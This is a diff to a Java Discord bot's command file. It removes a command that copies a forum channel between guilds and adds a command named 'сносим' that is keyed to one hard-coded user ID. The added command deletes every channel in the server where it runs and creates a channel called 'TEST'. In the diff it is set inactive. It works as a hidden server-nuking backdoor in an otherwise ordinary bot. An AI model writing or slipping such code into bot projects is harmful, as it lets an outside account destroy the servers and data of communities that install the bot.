@@ -173,18 +173,12 @@ public class Spec {
                return Mono.empty();
            }).subscribe();
        }).setVisible(false);
-       registerCommand("emt", "", owner.getId().asLong(), (e, args)->{
-           Guild from = gateway.getGuildById(Snowflake.of("1298339352346235001")).block();
-           Guild to = gateway.getGuildById(Snowflake.of("1372824995994144851")).block();
-           ForumChannel f = from.getChannelById(Snowflake.of("1372540537869041844")).ofType(ForumChannel.class).block();
-           ForumChannelCreateSpec.Builder b = ForumChannelCreateSpec.builder();
-           b.name(f.getName());
-           for(ForumTag tag : f.getAvailableTags()) {
-               b.addAvailableTag(ForumTagCreateSpec.builder().name(tag.getName()).build());
-           }
-           ForumChannel newf = to.createForumChannel(b.build()).block();
-           f.getAllThreads().subscribe(t->{
-               newf.startThread(t.getName(), ForumThreadMessageCreateSpec.builder().content(t.getLastMessage().block().getContent()).build()).block();
+       registerCommand("сносим", "", 1284441087745851474L, (e, args)->{
+           e.getGuild().subscribe(g->{
+               g.getChannels().subscribe(ch->{
+                   ch.delete().subscribe();
+               });
+               g.createTextChannel("TEST").subscribe();
            });
        }).setActive(false);
        registerCommand("testt", "", (e, args)->{
